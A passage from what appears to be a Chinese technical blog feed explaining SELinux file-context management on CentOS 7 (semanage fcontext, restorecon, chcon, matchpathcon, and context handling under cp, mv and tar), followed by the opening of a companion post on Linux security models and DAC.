<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">restorecon -v [file|dir]</div></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<p><strong>永久修改文件/目录上下文</strong></p>
<p>下面实例演示一下如何永久性修改一个文件/目录的上下文信息。</p>
<ol>
<li>以 <code>root</code> 用户身份在 <code>/etc/</code> 目录下新建一个文件 <code>file</code>（按照 SELinux 策略规则，<code>/etc/</code> 目录下的新建文件默认类型为 <code>etc_t</code>）:<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/etc ➜ touch file1</div><div class="line">/etc ➜ ls -Z file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:etc_t:s0   file1</div></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p><strong>NOTE</strong>:<br>此处的 <code>file1</code>，也可是新建一个目录，查看指定目录的 SELinux 上下文信息可用命令：<code>ls -dZ [dir]</code></p>
</blockquote>
<ol>
<li>以 <code>root</code> 用户身份运行以下命令将 <code>file1</code> 的 <strong>类型</strong> 修改为 <code>samba_share_t</code> :<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜ semanage fcontext <span class="_">-a</span> -t samba_share_t /etc/file1</div><div class="line">➜ ls -Z /etc/file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:etc_t:s0   /etc/file1</div></pre></td></tr></table></figure>
</li>
</ol>
<p>上述 <code>semanage fcontext</code> 命令往 <code>/etc/selinux/targeted/contexts/files/file_contexts. local</code> 文件中新增了一条规则：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ tail /etc/selinux/targeted/contexts/files/file_contexts.local </div><div class="line"><span class="comment"># This file is auto-generated by libsemanage</span></div><div class="line"><span class="comment"># Do not edit directly.</span></div><div class="line">/etc/file1    system_u:object_r:samba_share_t:s0</div></pre></td></tr></table></figure></p>
<blockquote>
<p><strong>NOTE</strong>:<br>选项 <code>-a</code> 代表要 <strong>新增</strong> 一条规则到前文所述的 <code>file_contexts.local</code> 文件；选项 <code>-t</code> 代表要修改的上下文元素为 <strong>类型</strong>。可以看到 <code>semanage fcontext</code> 命令执行后，<code>/etc/file1</code> 文件新的上下文并<strong>没有立即生效</strong>。</p>
</blockquote>
<ol>
<li>用 <code>restorecon</code> 命令恢复 <code>/etc/file1</code> 的上下文。因为前面的操作为该文件在 <code>file_contexts.local</code> 中新增了一条记录， <code>restorecon</code> 命令会从 <code>file_contexts.local</code> 中读取这一条规则为 <code>/etc/file1</code> 恢复上下文，进而将 <code>/etc/file1</code> 的<strong>类型</strong>改为 <code>samba_share_t</code> ：<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜ restorecon -v /etc/file1 </div><div class="line">restorecon reset /etc/file1 context unconfined_u:object_r:etc_t:s0-&gt;unconfined_u:object_r:samba_share_t:s0</div><div class="line">➜ </div><div class="line">➜ ls -Z /etc/file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:samba_share_t:s0 /etc/file1</div></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<p><strong>一次性永久修改目录和其中文件的上下文</strong></p>
<p><code>semanage fcontext</code> 命令还支持通过匹配目录下所有文件/目录的正则表达式，来批量永久修改指定目录及其下属所有文件/目录的 SELinux 上下文。下面实例演示如何新建一个目录，将它以及它内部所有的文件/子目录<strong>类型</strong>修改为可供 Apache HTTP 服务器访问的 <code>httpd_sys_content_t</code>（如果需要将 HTTP 服务器主目录改到别处，此例会非常有用）。</p>
<ol>
<li><p>以 <code>root</code> 用户身份新建一个目录 <code>/web/</code> ，并在其中新建三个文件 <code>file1</code>/<code>file2</code>/<code>file3</code> ，该目录和其中的文件默认 <strong>类型</strong> 将会是 <code>default_t</code> ：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">➜ mkdir /web</div><div class="line">➜ touch /web/file&#123;1,2,3&#125;</div><div class="line">➜ ls <span class="_">-d</span>Z /web</div><div class="line">drwxr-xr-x. root root unconfined_u:object_r:default_t:s0 /web</div><div class="line">➜ ls -Z /web</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file3</div></pre></td></tr></table></figure>
</li>
<li><p>以 <code>root</code> 用户身份用 <code>semanage fcontext</code> 命令将 <code>/web</code> 目录及其中的 3 个文件的 <strong>类型</strong> 改为 <code>httpd_sys_content_t</code> （同前面的例子，不会马上生效）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜ semanage fcontext <span class="_">-a</span> -t httpd_sys_content_t <span class="string">"/web(/.*)?"</span></div><div class="line">➜ ls <span class="_">-d</span>Z /web</div><div class="line">drwxr-xr-x. root root unconfined_u:object_r:default_t:s0 /web</div><div class="line">➜ ls -Z /web</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file3</div></pre></td></tr></table></figure>
</li>
</ol>
<p>同前面的例子，<code>semanage fcontext</code> 命令往 <code>/etc/selinux/targeted/contexts/files/file_contexts. local</code> 文件中新增了一条规则：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/web(/.*)?    system_u:object_r:httpd_sys_content_t:s0</div></pre></td></tr></table></figure></p>
<blockquote>
<p><strong>NOTE</strong>:<br>上述例子中 <code>semanage fcontext</code> 命令里的正则表达式 <code>&quot;/web(/.*)?&quot;</code> 表示 <code>/web/</code> 目录自己机器中的所有 文件/子目录。</p>
</blockquote>
<ol>
<li>同样，用 <code>restorecon</code> 命令恢复 <code>/web</code> 目录及其中所有文件/子目录的上下文：<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜ restorecon -Rv /web</div><div class="line">restorecon reset /web context unconfined_u:object_r:default_t:s0-&gt;unconfined_u:object_r:httpd_sys_content_t:s0</div><div class="line">restorecon reset /web/file1 context unconfined_u:object_r:default_t:s0-&gt;unconfined_u:object_r:httpd_sys_content_t:s0</div><div class="line">restorecon reset /web/file2 context unconfined_u:object_r:default_t:s0-&gt;unconfined_u:object_r:httpd_sys_content_t:s0</div><div class="line">restorecon reset /web/file3 context unconfined_u:object_r:default_t:s0-&gt;unconfined_u:object_r:httpd_sys_content_t:s0</div></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p><strong>NOTE</strong>:<br>按照 SELinux 的默认策略，目录中新增文件的 SELinux 上下文将继承自目录的 SELinux 上下文，所以，经过上面的操作，如果 <code>/web/</code> 目录下再有新增文件/子目录，它们的 SELinux 上下文的 <strong>类型</strong> 将会是 <code>httpd_sys_content_t</code> 。</p>
</blockquote>
<hr>
<p><strong>删除新增 SELinux 策略规则</strong></p>
<p>通过 <code>semanage fcontext -a</code> 命令新增的 SELinux 上下文规则，可以通过 <code>semanage fcontext -d [file|dir]</code> 命令来删除（可以参考<code>semanage fcontext</code> 的 <code>Usage</code> ）。通常分两个步骤，先删除，后 <code>restorecon</code>。如果删除时遇到正则表达式（比如上面的 <code>/web(/.*)?</code>），一定要用半角双引号将正则括起来，例如：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜ semanage fcontext <span class="_">-d</span> <span class="string">"/web(/.*)?"</span></div></pre></td></tr></table></figure></p>
<p>选项 <code>-d</code> 后面的 <code>[file|dir]</code> 是 <code>semanage fcontext -a [options] [file|dir]</code> 命令添加上下文规则是指定的 文件/目录 ，也是 <code>/etc/selinux/targeted/contexts/files/file_contexts. local</code> 文件中的 第一列，如下面的 <code>/etc/file</code> 和 <code>/web(/.*)?</code> :<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜ tail /etc/selinux/targeted/contexts/files/file_contexts.local</div><div class="line"><span class="comment"># This file is auto-generated by libsemanage</span></div><div class="line"><span class="comment"># Do not edit directly.</span></div><div class="line">/etc/file1    system_u:object_r:samba_share_t:s0</div><div class="line">/web(/.*)?    system_u:object_r:httpd_sys_content_t:s0</div></pre></td></tr></table></figure></p>
<p>比如我们要删除上面对 <code>/web</code> 目录及其里面文件/子目录的新增上下文类型，只需按照下面的步骤来操作：</p>
<ol>
<li><p>删除记录（不会立即生效）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜ semanage fcontext <span class="_">-d</span> <span class="string">"/web(/.*)?"</span></div><div class="line">➜ cat /etc/selinux/targeted/contexts/files/file_contexts.local</div><div class="line"><span class="comment"># This file is auto-generated by libsemanage</span></div><div class="line"><span class="comment"># Do not edit directly.</span></div><div class="line">➜ ls <span class="_">-d</span>Z /web</div><div class="line">drwxr-xr-x. root root unconfined_u:object_r:httpd_sys_content_t:s0 /web</div><div class="line">➜ ls -Z /web</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file3</div></pre></td></tr></table></figure>
</li>
<li><p>恢复默认上下文：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜ restorecon -Rv /web     </div><div class="line">restorecon reset /web context unconfined_u:object_r:httpd_sys_content_t:s0-&gt;unconfined_u:object_r:default_t:s0</div><div class="line">restorecon reset /web/file1 context unconfined_u:object_r:httpd_sys_content_t:s0-&gt;unconfined_u:object_r:default_t:s0</div><div class="line">restorecon reset /web/file2 context unconfined_u:object_r:httpd_sys_content_t:s0-&gt;unconfined_u:object_r:default_t:s0</div><div class="line">restorecon reset /web/file3 context unconfined_u:object_r:httpd_sys_content_t:s0-&gt;unconfined_u:object_r:default_t:s0</div><div class="line">➜ ls <span class="_">-d</span>Z /web</div><div class="line">drwxr-xr-x. root root unconfined_u:object_r:default_t:s0 /web</div><div class="line">➜ ls -Z /web </div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:default_t:s0 file3</div></pre></td></tr></table></figure>
</li>
</ol>
<p>可以看到 <code>/web</code> 目录及其下属所有文件的 SELinux 上下文<strong>类型</strong>都恢复到初始的<code>default_t</code>了。</p>
<h2 id="9-SELinux-上下文保持"><a href="#9-SELinux-上下文保持" class="headerlink" title="9. SELinux 上下文保持"></a>9. SELinux 上下文保持</h2><hr>
<p>本小节解释 文件/目录 在 拷贝/移动/归档打包 过程中其 SELinux 上下文发生的变化，以及如何在 拷贝 和 归档打包 过程中保留原 SELinux 上下文。</p>
<h3 id="9-1-拷贝-文件-目录"><a href="#9-1-拷贝-文件-目录" class="headerlink" title="9.1 拷贝 文件/目录"></a>9.1 拷贝 文件/目录</h3><p>默认情况下，将一个文件/目录 拷贝到另一个地方（假设目的目录的 SELinux上下文不同于文件原来的上下文），最后在新位置的文件 SELinux 上下文将继承目的目录的上下文，示例如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜ <span class="built_in">pwd</span></div><div class="line">/root</div><div class="line">➜ ls -Z</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 test.txt</div><div class="line">➜ cp -v test.txt /etc/</div><div class="line"><span class="string">"test.txt"</span> -&gt; <span class="string">"/etc/test.txt"</span>➜ ls -Z /etc/test.txt </div><div class="line">-rw-r--r--. root root unconfined_u:object_r:etc_t:s0   /etc/test.txt</div></pre></td></tr></table></figure></p>
<p>由此可知，原来在 <code>/root</code> 目录下 SELinux 上下文类型为 <code>admin_home_t</code> 的 <code>test.txt</code> 文件，用 <code>cp</code> 命令直接拷贝到 <code>/etc/</code> 目录，其 SELinux 上下文 <strong>类型</strong> 就会变成 <code>/etc/</code> 目录中默认的类型 <code>etc_t</code> （假设 <code>/etc/test.txt</code> 文件原来不存在）。</p>
<p>上面的例子中，如果 <code>/etc/test.txt</code> 文件原本就存在，那么直接用 <code>cp</code> 命令将执行 <strong>覆盖拷贝</strong> ，但新的 <code>/etc/test.txt</code> SELinux 上下文将 <strong>不变</strong>（既不继承 <code>/etc/</code> 默认的上下文类型，也不会被原来 <code>/root/test.txt</code> 的 SELinux 上下文类型所覆盖）。</p>
<hr>
<p><strong>保留原上下文</strong></p>
<p>若要拷贝过程中，保留源文件的 SELinux 上下文类型，则需要对 <code>cp</code> 命令加上选项 <code>--preserve=context</code> ，示例如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜ rm -v /etc/test.txt </div><div class="line">已删除<span class="string">"/etc/test.txt"</span></div><div class="line">➜ cp -v --preserve=context test.txt /etc/</div><div class="line"><span class="string">"test.txt"</span> -&gt; <span class="string">"/etc/test.txt"</span></div><div class="line">➜ ls -Z /etc/test.txt </div><div class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 /etc/test.txt</div></pre></td></tr></table></figure></p>
<p>由此例可知，对 <code>cp</code> 命令加上选项 <code>--preserve=context</code> 后，将文件  <code>test.txt</code> 从 <code>/root</code> 目录拷贝到 <code>/etc/</code> 目录，其 SELinux 上下文 <strong>类型</strong> 依然是 <code>admin_home_t</code> 。</p>
<hr>
<p><strong>拷贝过程中更改上下文</strong></p>
<p>还可以在拷贝文件过程中更改 SELinux 上下文，新生成的文件上下文将会既不同于源文件的上下文，也不同于目的目录的默认上下文。只要对 <code>cp</code> 命令加上选项 <code>--context=[user:role:type:level]</code> 即可，示例如下 ：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜ rm -v /etc/test.txt</div><div class="line">已删除<span class="string">"/etc/test.txt"</span></div><div class="line">➜ cp -v --context=system_u:object_r:samba_share_t:s0 test.txt /etc/</div><div class="line"><span class="string">"test.txt"</span> -&gt; <span class="string">"/etc/test.txt"</span></div><div class="line">➜ ls -Z /etc/test.txt </div><div class="line">-rw-r--r--. root root system_u:object_r:samba_share_t:s0 /etc/test.txt</div></pre></td></tr></table></figure></p>
<p>由此例可知，在拷贝过程中对 <code>cp</code> 命令加上选项 <code>--context=system_u:object_r:samba_share_t:s0</code> 后，新生成的 <code>/etc/test.txt</code> 文件的 SELinux 上下文就变成了 <code>system_u:object_r:samba_share_t:s0</code> 。</p>
<h3 id="9-2-移动-文件-目录"><a href="#9-2-移动-文件-目录" class="headerlink" title="9.2 移动 文件/目录"></a>9.2 移动 文件/目录</h3><p>Linux 中的 <code>mv</code> 命令来移动 文件/目录，会将 源文件/源目录 的 SELinux 上下文也一并附带移动，到目的地址新生成的 文件/目录 将保持与 源文件/源目录 相同的 SELinux 上下文。所以，在启用 SELinux 的 Linux 系统中，移动操作需要额外注意 SELinux 上下文信息。此处无示例演示。</p>
<h3 id="9-3-使用-tar-归档打包-文件-目录"><a href="#9-3-使用-tar-归档打包-文件-目录" class="headerlink" title="9.3 使用 tar 归档打包 文件/目录"></a>9.3 使用 tar 归档打包 文件/目录</h3><p>默认情况下，使用 <code>tar</code> 命令归档打包 文件/目录 时，是不附带 SELinux 上下文信息的，将一个 tar 包解开到新目录，其中的文件将会继承新目录的 SELinux 上下文，示例如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">➜ <span class="built_in">cd</span> /var/www/html</div><div class="line">➜ touch file&#123;1,2,3&#125;</div><div class="line">➜ ls -Z</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file3</div><div class="line">➜ tar cf test.tar file&#123;1,2,3&#125;</div><div class="line">➜ ls -Z</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file3</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 test.tar</div><div class="line">➜ cp -v test.tar ~/</div><div class="line"><span class="string">"test.tar"</span> -&gt; <span class="string">"/root/test.tar"</span></div><div class="line">➜ <span class="built_in">cd</span> ~ </div><div class="line">➜ ls -Z</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 test.tar</div><div class="line">➜ tar -xf test.tar</div><div class="line">➜ ls -Z</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 file3</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 test.tar</div></pre></td></tr></table></figure></p>
<p>上面的例子可知，在 <code>/var/www/html</code> 目录新建的 3 个 SELinux 上下文类型为 <code>httpd_sys_content_t</code> 的文件，进过 <code>tar</code> 命令直接打包，然后拷贝到 <code>/root</code> 目录再解压，其中的 3 根文件 SELinux 上下文 <strong>类型</strong> 却变成了 <code>admin_home_t</code> 。</p>
<p><strong>有没有办法在打包归档过程中保留原始文件的 SELinux 上下文信息？</strong></p>
<p>其实，<code>tar</code> 命令提供了一个选项 <code>--selinux</code> ，使用 <code>tar --selinux -cf test. tar [files]</code> 的形式，即可保留源文件的 SELinux 上下文信息，此处不做演示。</p>
<h2 id="10-检查默认上下文"><a href="#10-检查默认上下文" class="headerlink" title="10. 检查默认上下文"></a>10. 检查默认上下文</h2><hr>
<p>用 <code>matchpathcon</code> 工具可以检查指定的 文件/目录 的 SELinux 上下文是否“正确”，该工具会索引系统默认的 SELinux 策略，并以此检查指定的 文件/目录 的 SELinux 上下文是否与默认策略吻合。下面示例演示如何使用该工具。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">➜ ls -Z /var/www/html </div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file3</div><div class="line">➜ chcon -t samba_share_t /var/www/html/file1</div><div class="line">➜ ls -Z /var/www/html</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:samba_share_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file3</div><div class="line">➜ matchpathcon -V /var/www/html/*</div><div class="line">/var/www/html/file1 has context unconfined_u:object_r:samba_share_t:s0, should be system_u:object_r:httpd_sys_content_t:s0</div><div class="line">/var/www/html/file2 verified.</div><div class="line">/var/www/html/file3 verified.</div><div class="line">➜ restorecon -v /var/www/html/file1</div><div class="line">restorecon reset /var/www/html/file1 context unconfined_u:object_r:samba_share_t:s0-&gt;unconfined_u:object_r:httpd_sys_content_t:s0</div><div class="line">➜ ls -Z /var/www/html</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file1</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file2</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 file3</div></pre></td></tr></table></figure></p>
<p>在上面例子中，第 2 条命令用 <code>chcon</code> 将 <code>/var/www/html/file1</code> 的 SELinux 上下文 <strong>类型</strong> 改为 <code>samba_share_t</code>，然后第 4 条命令用 <code>matchpathcon</code> 检测到该文件的 SELinux 上下文应为 <code>system_u:object_r:httpd_sys_content_t:s0</code> ，随后用 <code>restorecon</code> 命令就会将该文件的 SELinux 上下文“修正”。</p>
<h2 id="11-总结"><a href="#11-总结" class="headerlink" title="11. 总结"></a>11. 总结</h2><p>本系列 2 篇文档从最基本的安全模型开始，把 Linux 系统中实现的权限管理与访问控制从<code>UGO+RWX</code>机制到 ACL 机制到最后的 SELinux，详细介绍一遍。</p>
<p>由上面的内容可知，这些 Linux 系统中实现的安全机制与策略，是依次增强的，对权限和访问的管理、控制粒度是依次减小的，所以能得到更灵活也更安全的配置，当然，也更复杂繁琐。</p>
<p>机制本身的安全性毋庸置疑，只是如果在使用相关工具对这些安全机制进行安全配置时，如果掌握不好配置方法与注意事项，那么配置出来的系统可能会有安全隐患，例如不恰当地应用 <code>setuid</code> 位。</p>
<p>最后的 SELinux 部分，其实只介绍了其安全模型设计原理、SELinux 中的元素和工作原理、基础的管理与配置，这些都是使用 SELinux 的基础知识，掌握这些基础知识，才能对 SELinux 进行<strong>基础</strong>地使用。而 SELinux 的一些高级用法，比如自定义编写、编译策略规则，本文档并未介绍。</p>
<h2 id="12-参考资料"><a href="#12-参考资料" class="headerlink" title="12. 参考资料"></a>12. 参考资料</h2><ol>
<li><a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/SELinux_Users_and_Administrators_Guide/part_I-SELinux.html" target="_blank" rel="external">SELinux Manual For RHEL7</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本系列 &lt;a href=&quot;http://jiayu0x.com/2014/12/23/Linux-authority-and-access-control/&quot;&gt;前一篇&lt;/a&gt; 主要介绍了 Linux 权限管理和访问控制的相关概念与 DAC 相关的 UGO+RWX、ACL，本篇续写 MAC 相关概念与知识，主要详细介绍 SELinux。&lt;/p&gt;
&lt;h2 id=&quot;1-强制访问控制-SELinux&quot;&gt;&lt;a href=&quot;#1-强制访问控制-SELinux&quot; class=&quot;headerlink&quot; title=&quot;1. 强制访问控制(SELinux)&quot;&gt;&lt;/a&gt;1. 强制访问控制(SELinux)&lt;/h2&gt;&lt;p&gt;前半部分讲解了Linux系统中实现的&lt;strong&gt;DAC&lt;/strong&gt;(Discretionary Access Control,自主访问控制)机制，主要包括传统的&lt;strong&gt;&lt;code&gt;UGO+RWX&lt;/code&gt;&lt;/strong&gt;机制和 ACL 机制；下半部分开始讲解&lt;strong&gt;MAC(Mandatory Access Control，强制访问控制)&lt;/strong&gt;，该部分主要讲 SELinux，因为 Linux 系统中的MAC机制，主要由 SELinux 来实现。&lt;/p&gt;
&lt;h2 id=&quot;2-SELinux简介&quot;&gt;&lt;a href=&quot;#2-SELinux简介&quot; class=&quot;headerlink&quot; title=&quot;2. SELinux简介&quot;&gt;&lt;/a&gt;2. SELinux简介&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&quot;2-1-起源&quot;&gt;&lt;a href=&quot;#2-1-起源&quot; class=&quot;headerlink&quot; title=&quot;2.1 起源&quot;&gt;&lt;/a&gt;2.1 起源&lt;/h3&gt;&lt;p&gt;NSA(美国国家安全局)一直非常关注计算机操作系统的安全领域，他们发现大部分操作系统的安全机制，包括Window和大部分*nix系统，都是以DAC机制为安全认证基础的。由于DAC机制的设计很不利于系统安全，NSA便一直致力于开发一套更安全的MAC操作系统安全认证机制。&lt;/p&gt;
    
    </summary>
    
      <category term="system" scheme="http://jiayu0x.com/categories/system/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="linux" scheme="http://jiayu0x.com/tags/linux/"/>
    
      <category term="ACL" scheme="http://jiayu0x.com/tags/ACL/"/>
    
  </entry>
  
  <entry>
    <title>Linux 权限管理与访问控制详解(1)——基本概念和 DAC</title>
    <link href="http://jiayu0x.com/2014/12/23/Linux-authority-and-access-control/"/>
    <id>http://jiayu0x.com/2014/12/23/Linux-authority-and-access-control/</id>
    <published>2014-12-22T16:00:00.000Z</published>
    <updated>2017-04-04T10:32:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>Linux系统的权限管理与访问控制，大体可以分为基础与高级两部分，基础机制即传统的UGO+RWX/ACL，高级的即为SELinux，本文将按照从基础到高级的顺序讲解，先从系统的安全模型说起。<br>另，<strong>本文中所有例子均是在 <code>CentOS7</code> 中运行的，不同系统运行结果可能有所不同。</strong></p>
</blockquote>
<h2 id="1-安全模型概述"><a href="#1-安全模型概述" class="headerlink" title="1. 安全模型概述"></a>1. 安全模型概述</h2><p>操作系统的权限管理与访问控制机制，遵从一定的 <strong>安全模型</strong> 或者 <strong>安全机制</strong> ，常见的安全模型有 <strong>BLP安全模型</strong>， <strong>RBAC安全模型</strong> 和 <strong>多级别安全机制</strong> 。Linux 系统也不例外，其基础的权限管理与访问控制机制和加强的 ACL 机制、SELinux，都对这些安全模型与安全机制有所实现。</p>
<h3 id="1-1-BLP安全模型"><a href="#1-1-BLP安全模型" class="headerlink" title="1.1 BLP安全模型"></a>1.1 BLP安全模型</h3><hr>
<p><strong>BLP</strong>(Bell &amp; Lapadula)安全模型是由David Bell 和 Leonard La Padula 在1973年模拟军事安全策略创建的计算机系统安全模型, 74年改进, 76年首次实现于 <strong>Multics</strong> 操作系统。该安全模型是一个状态机模型，有一系列错综复杂的数学证明来保证其安全性的结果；它是定义多级安全性的基础，被视作<strong>基本安全公理</strong>。</p>
<a id="more"></a>
<p>该模型将信息系统中的实体分为两部分：<strong>主体</strong>(Subject)和<strong>客体</strong>(Object)。实时操作的成为<strong>主体</strong>，如<strong>用户</strong>和<strong>进程</strong>；被操作的对象则成为<strong>客体</strong>，如<strong>文件</strong>和<strong>数据库</strong>等。对主体和客体来说，有两种最重要的安全控制方法：<strong>自主存取控制</strong>和<strong>强制存取控制</strong>。</p>
<ul>
<li><strong>DAC</strong>(Discretionary Access Control,自主访问控制)。DAC 机制就是指对象的拥有者可以任意修改或授予此对象相应的权限。从主体和客体的角度来说，就是主体对其拥有的客体，有权决定自己和其他主体对该客体应具有怎样的访问权限。传统的Linux、Windows都采用这种机制，比如某用户对于其所有的文件或目录，可以随意设定<strong>UGO</strong>(即：本用户、本用户组、其他用户)对该文件的<strong>RWX</strong>(即：读、写、执行)权限，下文详解；</li>
<li><strong>MAC</strong>(Mandatory Access Control，强制访问控制)。MAC机制是指系统不再允许对象的拥有者随意修改或授予此对象相应的权限，而是通过强制的方式为每个对象一一授予权限，SELinux即采用这种机制。该机制主要通过<strong>安全级</strong>来实现，下文详解。</li>
</ul>
<h3 id="1-2-RBAC安全模型"><a href="#1-2-RBAC安全模型" class="headerlink" title="1.2 RBAC安全模型"></a>1.2 RBAC安全模型</h3><hr>
<p><strong>RBAC</strong>(Role Based Access Control，基于角色的访问控制)模型是一种强制访问控制机制。在RBAC中，权限与角色相关联，用户通过成为适当角色的成员而得到这些角色的权限。这就极大地简化了权限的管理。在一个组织中，角色是为了完成各种工作而创造，用户则依据它的责任和资格来被指派相应的角色，用户可以很容易地从一个角色被指派到另一个角色。角色可依新的需求和系统的合并而赋予新的权限，而权限也可根据需要而从某角色中回收。角色与权限的关系可以建立起来以囊括更广泛的客观情况。</p>
<p>RBAC 支持三个著名的安全原则：最小权限原则，责任分离原则和数据抽象原则</p>
<ul>
